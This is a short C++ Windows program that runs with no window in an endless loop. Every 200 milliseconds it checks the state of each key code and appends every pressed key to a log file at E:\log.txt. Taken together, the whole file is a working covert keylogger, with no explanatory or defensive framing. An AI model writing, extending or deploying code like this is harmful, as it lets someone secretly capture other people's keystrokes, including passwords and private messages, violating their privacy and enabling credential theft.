#include "framework.h"
#include "SP5.h"
#include <cstdlib>
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <direct.h>
#include <CTime>
#include <string.h>

using namespace std;

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

int CALLBACK WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow
)
{
	while (true)
	{
		Sleep(200);
		for (int i = 1; i <= 256; i++)
		{
			if (GetAsyncKeyState(i))
			{
				ofstream fout("E:\\log.txt", ios::app);
				if (i != 1)
					fout << (char)i;
				fout.close();
			}
		}
	}

}